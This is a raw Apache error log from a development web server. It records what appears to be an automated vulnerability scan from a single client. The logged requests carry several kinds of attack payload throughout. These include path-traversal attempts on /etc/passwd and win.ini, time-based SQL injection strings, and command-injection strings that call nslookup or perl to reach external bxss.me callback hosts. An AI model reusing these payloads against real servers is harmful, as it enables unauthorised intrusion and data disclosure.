[Wed Jul 07 19:29:36.491792 2021] [php7:error] [pid 14415] [client 27.147.202.214:14539] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:29:36.751186 2021] [php7:error] [pid 14857] [client 27.147.202.214:9873] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:29:37.435911 2021] [php7:error] [pid 14692] [client 27.147.202.214:8076] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:29:37.576802 2021] [core:error] [pid 14382] [client 27.147.202.214:14548] AH00126: Invalid URI in request GET /js/extention//../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:29:37.702961 2021] [php7:error] [pid 14857] [client 27.147.202.214:9873] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:29:38.587814 2021] [core:error] [pid 14692] [client 27.147.202.214:8076] AH00126: Invalid URI in request GET /js/extention//../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:29:38.749554 2021] [core:error] [pid 15013] (36)File name too long: [client 27.147.202.214:1162] AH00036: access to /css/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd failed (filesystem path '/var/www/html/dev.wilkescw.com/css/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af')
[Wed Jul 07 19:29:38.988741 2021] [core:error] [pid 15011] (36)File name too long: [client 27.147.202.214:10775] AH00036: access to /;(nslookup hitkvrmfdutnu19416.bxss.me||perl -e "gethostbyname('hitkvrmfdutnu19416.bxss.me')")|(nslookup hitkvrmfdutnu19416.bxss.me||perl -e "gethostbyname('hitkvrmfdutnu19416.bxss.me')")&(nslookup hitkvrmfdutnu19416.bxss.me||perl -e "gethostbyname('hitkvrmfdutnu19416.bxss.me')")/users.php failed (filesystem path '/var/www/html/dev.wilkescw.com/;(nslookup hitkvrmfdutnu19416.bxss.me||perl -e "gethostbyname('hitkvrmfdutnu19416.bxss.me')")|(nslookup hitkvrmfdutnu19416.bxss.me||perl -e "gethostbyname('hitkvrmfdutnu19416.bxss.me')")&(nslookup hitkvrmfdutnu19416.bxss.me||perl -e "gethostbyname('hitkvrmfdutnu19416.bxss.me')")')
[Wed Jul 07 19:29:38.989642 2021] [php7:error] [pid 14369] [client 27.147.202.214:10771] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:29:39.131719 2021] [php7:error] [pid 14785] [client 27.147.202.214:10159] script '/var/www/html/dev.wilkescw.com/admin/0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:29:39.626425 2021] [core:error] [pid 14904] (36)File name too long: [client 27.147.202.214:10910] AH00036: access to /js/extention/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd failed (filesystem path '/var/www/html/dev.wilkescw.com/js/extention/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af')
[Wed Jul 07 19:29:39.887015 2021] [core:error] [pid 15008] [client 27.147.202.214:10080] AH00126: Invalid URI in request GET /js/extention//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Wed Jul 07 19:29:40.210334 2021] [core:error] [pid 14375] [client 27.147.202.214:14533] AH00126: Invalid URI in request GET /js/extention//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Wed Jul 07 19:29:40.398573 2021] [core:error] [pid 14369] [client 27.147.202.214:10771] AH00126: Invalid URI in request GET /js/extention//../../../../../../../../boot.ini HTTP/1.1
[Wed Jul 07 19:29:40.530134 2021] [php7:error] [pid 14808] [client 27.147.202.214:10923] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:29:41.477628 2021] [php7:error] [pid 14808] [client 27.147.202.214:10923] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:29:41.743811 2021] [php7:error] [pid 15017] [client 27.147.202.214:10163] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/admin/users.php?992901@
[Wed Jul 07 19:29:43.638066 2021] [php7:error] [pid 15017] [client 27.147.202.214:10163] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/admin/users.php?id=926777@
[Wed Jul 07 19:29:44.154141 2021] [core:error] [pid 14337] [client 27.147.202.214:1164] AH00126: Invalid URI in request GET /fonts/OpenSans/../../../Gemfile HTTP/1.1
[Wed Jul 07 19:29:44.479107 2021] [core:error] [pid 15008] [client 27.147.202.214:3617] AH00126: Invalid URI in request GET /fonts/OpenSans/../../../web.config HTTP/1.1
[Wed Jul 07 19:29:44.783591 2021] [core:error] [pid 14415] (36)File name too long: [client 27.147.202.214:11016] AH00036: access to /;(nslookup hitzoudyuytemaf3ee.bxss.me||perl -e "gethostbyname('hitzoudyuytemaf3ee.bxss.me')")|(nslookup hitzoudyuytemaf3ee.bxss.me||perl -e "gethostbyname('hitzoudyuytemaf3ee.bxss.me')")&(nslookup hitzoudyuytemaf3ee.bxss.me||perl -e "gethostbyname('hitzoudyuytemaf3ee.bxss.me')")/extention/choices.js failed (filesystem path '/var/www/html/dev.wilkescw.com/;(nslookup hitzoudyuytemaf3ee.bxss.me||perl -e "gethostbyname('hitzoudyuytemaf3ee.bxss.me')")|(nslookup hitzoudyuytemaf3ee.bxss.me||perl -e "gethostbyname('hitzoudyuytemaf3ee.bxss.me')")&(nslookup hitzoudyuytemaf3ee.bxss.me||perl -e "gethostbyname('hitzoudyuytemaf3ee.bxss.me')")')
[Wed Jul 07 19:29:44.799015 2021] [core:error] [pid 14359] [client 27.147.202.214:10850] AH00126: Invalid URI in request GET /fonts/OpenSans/../../../package.json HTTP/1.1
[Wed Jul 07 19:29:45.126222 2021] [core:error] [pid 15009] [client 27.147.202.214:14562] AH00126: Invalid URI in request GET /fonts/OpenSans/../../../package-lock.json HTTP/1.1
[Wed Jul 07 19:29:45.397732 2021] [core:error] [pid 14692] [client 27.147.202.214:11035] AH00126: Invalid URI in request GET /js/extention//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Wed Jul 07 19:29:45.728880 2021] [core:error] [pid 14943] [client 27.147.202.214:10887] AH00126: Invalid URI in request GET /js/extention//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Wed Jul 07 19:29:48.280559 2021] [core:error] [pid 14467] [client 27.147.202.214:8106] AH00126: Invalid URI in request GET /fonts/OpenSans/../../../../Gemfile HTTP/1.1
[Wed Jul 07 19:29:48.581152 2021] [core:error] [pid 14796] [client 27.147.202.214:10816] AH00126: Invalid URI in request GET /fonts/OpenSans/../../../../web.config HTTP/1.1
[Wed Jul 07 19:29:48.879713 2021] [core:error] [pid 13710] [client 27.147.202.214:3770] AH00126: Invalid URI in request GET /fonts/OpenSans/../../../../package.json HTTP/1.1
[Wed Jul 07 19:29:49.685700 2021] [core:error] [pid 14910] (36)File name too long: [client 27.147.202.214:11005] AH00036: access to /js/extention/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd failed (filesystem path '/var/www/html/dev.wilkescw.com/js/extention/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af')
[Wed Jul 07 19:29:49.843586 2021] [core:error] [pid 14799] [client 27.147.202.214:7310] AH00126: Invalid URI in request GET /fonts/OpenSans/../../../../package-lock.json HTTP/1.1
[Wed Jul 07 19:29:50.843020 2021] [core:error] [pid 14415] (36)File name too long: [client 27.147.202.214:11016] AH00036: access to /js/;(nslookup hitywjrmwtpwa91446.bxss.me||perl -e "gethostbyname('hitywjrmwtpwa91446.bxss.me')")|(nslookup hitywjrmwtpwa91446.bxss.me||perl -e "gethostbyname('hitywjrmwtpwa91446.bxss.me')")&(nslookup hitywjrmwtpwa91446.bxss.me||perl -e "gethostbyname('hitywjrmwtpwa91446.bxss.me')")/choices.js failed (filesystem path '/var/www/html/dev.wilkescw.com/js/;(nslookup hitywjrmwtpwa91446.bxss.me||perl -e "gethostbyname('hitywjrmwtpwa91446.bxss.me')")|(nslookup hitywjrmwtpwa91446.bxss.me||perl -e "gethostbyname('hitywjrmwtpwa91446.bxss.me')")&(nslookup hitywjrmwtpwa91446.bxss.me||perl -e "gethostbyname('hitywjrmwtpwa91446.bxss.me')")')
[Wed Jul 07 19:29:51.492004 2021] [core:error] [pid 14692] [client 27.147.202.214:7308] AH00126: Invalid URI in request GET /fonts/OpenSans/../../../../../Gemfile HTTP/1.1
[Wed Jul 07 19:29:52.198871 2021] [core:error] [pid 14857] (36)File name too long: [client 27.147.202.214:9873] AH00036: access to /;(nslookup hitwnzprzrxegfe7e9.bxss.me||perl -e "gethostbyname('hitwnzprzrxegfe7e9.bxss.me')")|(nslookup hitwnzprzrxegfe7e9.bxss.me||perl -e "gethostbyname('hitwnzprzrxegfe7e9.bxss.me')")&(nslookup hitwnzprzrxegfe7e9.bxss.me||perl -e "gethostbyname('hitwnzprzrxegfe7e9.bxss.me')")/extention/custom-materialize.js failed (filesystem path '/var/www/html/dev.wilkescw.com/;(nslookup hitwnzprzrxegfe7e9.bxss.me||perl -e "gethostbyname('hitwnzprzrxegfe7e9.bxss.me')")|(nslookup hitwnzprzrxegfe7e9.bxss.me||perl -e "gethostbyname('hitwnzprzrxegfe7e9.bxss.me')")&(nslookup hitwnzprzrxegfe7e9.bxss.me||perl -e "gethostbyname('hitwnzprzrxegfe7e9.bxss.me')")')
[Wed Jul 07 19:29:52.496871 2021] [core:error] [pid 14799] [client 27.147.202.214:7498] AH00126: Invalid URI in request GET /fonts/OpenSans/../../../../../web.config HTTP/1.1
[Wed Jul 07 19:29:53.617516 2021] [core:error] [pid 14857] (36)File name too long: [client 27.147.202.214:9873] AH00036: access to /js/extention/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd failed (filesystem path '/var/www/html/dev.wilkescw.com/js/extention/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af')
[Wed Jul 07 19:29:53.853798 2021] [core:error] [pid 15017] [client 27.147.202.214:1089] AH00126: Invalid URI in request GET /fonts/OpenSans/../../../../../package.json HTTP/1.1
[Wed Jul 07 19:29:54.178145 2021] [core:error] [pid 14340] [client 27.147.202.214:1111] AH00126: Invalid URI in request GET /fonts/OpenSans/../../../../../package-lock.json HTTP/1.1
[Wed Jul 07 19:29:54.707001 2021] [core:error] [pid 14910] [client 27.147.202.214:11005] AH00126: Invalid URI in request GET /css//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:29:55.058961 2021] [core:error] [pid 14796] [client 27.147.202.214:7436] AH00126: Invalid URI in request GET /css//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:29:55.605387 2021] [php7:error] [pid 15011] [client 27.147.202.214:3457] script '/var/www/html/dev.wilkescw.com/admin/0"XOR(if(now()=sysdate(),sleep(15),0))XOR"Z.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:29:57.528273 2021] [core:error] [pid 14857] [client 27.147.202.214:9873] AH00126: Invalid URI in request GET /js/extention//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:29:57.843388 2021] [core:error] [pid 14376] [client 27.147.202.214:3780] AH00126: Invalid URI in request GET /js/extention//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:29:57.913358 2021] [core:error] [pid 14382] (36)File name too long: [client 27.147.202.214:11006] AH00036: access to /js/extention/;(nslookup hitkbeeqhssbxcf83d.bxss.me||perl -e "gethostbyname('hitkbeeqhssbxcf83d.bxss.me')")|(nslookup hitkbeeqhssbxcf83d.bxss.me||perl -e "gethostbyname('hitkbeeqhssbxcf83d.bxss.me')")&(nslookup hitkbeeqhssbxcf83d.bxss.me||perl -e "gethostbyname('hitkbeeqhssbxcf83d.bxss.me')").js failed (filesystem path '/var/www/html/dev.wilkescw.com/js/extention/;(nslookup hitkbeeqhssbxcf83d.bxss.me||perl -e "gethostbyname('hitkbeeqhssbxcf83d.bxss.me')")|(nslookup hitkbeeqhssbxcf83d.bxss.me||perl -e "gethostbyname('hitkbeeqhssbxcf83d.bxss.me')")&(nslookup hitkbeeqhssbxcf83d.bxss.me||perl -e "gethostbyname('hitkbeeqhssbxcf83d.bxss.me')").js')
[Wed Jul 07 19:29:57.936421 2021] [core:error] [pid 14364] [client 27.147.202.214:3889] AH00126: Invalid URI in request GET /css//........................................................................../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:29:58.268321 2021] [core:error] [pid 13710] [client 27.147.202.214:1270] AH00126: Invalid URI in request GET /css//........................................................................../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:29:59.776661 2021] [core:error] [pid 14419] [client 27.147.202.214:3839] AH00126: Invalid URI in request GET /js//../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:30:00.154478 2021] [core:error] [pid 14382] (36)File name too long: [client 27.147.202.214:11006] AH00036: access to /js/;(nslookup hitustsxzjgtc7f527.bxss.me||perl -e "gethostbyname('hitustsxzjgtc7f527.bxss.me')")|(nslookup hitustsxzjgtc7f527.bxss.me||perl -e "gethostbyname('hitustsxzjgtc7f527.bxss.me')")&(nslookup hitustsxzjgtc7f527.bxss.me||perl -e "gethostbyname('hitustsxzjgtc7f527.bxss.me')")/custom-materialize.js failed (filesystem path '/var/www/html/dev.wilkescw.com/js/;(nslookup hitustsxzjgtc7f527.bxss.me||perl -e "gethostbyname('hitustsxzjgtc7f527.bxss.me')")|(nslookup hitustsxzjgtc7f527.bxss.me||perl -e "gethostbyname('hitustsxzjgtc7f527.bxss.me')")&(nslookup hitustsxzjgtc7f527.bxss.me||perl -e "gethostbyname('hitustsxzjgtc7f527.bxss.me')")')
[Wed Jul 07 19:30:00.344020 2021] [core:error] [pid 14785] (36)File name too long: [client 27.147.202.214:1201] AH00036: access to /;(nslookup hitbmirlalyxh1a321.bxss.me||perl -e "gethostbyname('hitbmirlalyxh1a321.bxss.me')")|(nslookup hitbmirlalyxh1a321.bxss.me||perl -e "gethostbyname('hitbmirlalyxh1a321.bxss.me')")&(nslookup hitbmirlalyxh1a321.bxss.me||perl -e "gethostbyname('hitbmirlalyxh1a321.bxss.me')")/extention/flatpickr.js failed (filesystem path '/var/www/html/dev.wilkescw.com/;(nslookup hitbmirlalyxh1a321.bxss.me||perl -e "gethostbyname('hitbmirlalyxh1a321.bxss.me')")|(nslookup hitbmirlalyxh1a321.bxss.me||perl -e "gethostbyname('hitbmirlalyxh1a321.bxss.me')")&(nslookup hitbmirlalyxh1a321.bxss.me||perl -e "gethostbyname('hitbmirlalyxh1a321.bxss.me')")')
[Wed Jul 07 19:30:00.380101 2021] [core:error] [pid 14904] [client 27.147.202.214:1509] AH00126: Invalid URI in request GET /js//../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:30:01.609483 2021] [core:error] [pid 14785] [client 27.147.202.214:1201] AH00126: Invalid URI in request GET /js//../../../../../../../../boot.ini HTTP/1.1
[Wed Jul 07 19:30:02.343050 2021] [core:error] [pid 14419] [client 27.147.202.214:1600] AH00126: Invalid URI in request GET /js/extention//........................................................................../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:30:03.273923 2021] [core:error] [pid 14904] [client 27.147.202.214:5513] AH00126: Invalid URI in request GET /js/extention//........................................................................../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:30:04.651284 2021] [core:error] [pid 14756] [client 27.147.202.214:7448] AH00126: Invalid URI in request GET /js//../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:30:04.878096 2021] [core:error] [pid 14493] (36)File name too long: [client 27.147.202.214:5605] AH00036: access to /;(nslookup hitfrcsphoxfgb8f67.bxss.me||perl -e "gethostbyname('hitfrcsphoxfgb8f67.bxss.me')")|(nslookup hitfrcsphoxfgb8f67.bxss.me||perl -e "gethostbyname('hitfrcsphoxfgb8f67.bxss.me')")&(nslookup hitfrcsphoxfgb8f67.bxss.me||perl -e "gethostbyname('hitfrcsphoxfgb8f67.bxss.me')")/jquery.js failed (filesystem path '/var/www/html/dev.wilkescw.com/;(nslookup hitfrcsphoxfgb8f67.bxss.me||perl -e "gethostbyname('hitfrcsphoxfgb8f67.bxss.me')")|(nslookup hitfrcsphoxfgb8f67.bxss.me||perl -e "gethostbyname('hitfrcsphoxfgb8f67.bxss.me')")&(nslookup hitfrcsphoxfgb8f67.bxss.me||perl -e "gethostbyname('hitfrcsphoxfgb8f67.bxss.me')")')
[Wed Jul 07 19:30:05.318834 2021] [core:error] [pid 15127] [client 27.147.202.214:5292] AH00126: Invalid URI in request GET /js//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Wed Jul 07 19:30:05.593816 2021] [core:error] [pid 15011] [client 27.147.202.214:3457] AH00126: Invalid URI in request GET /css//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../etc/passwd HTTP/1.1
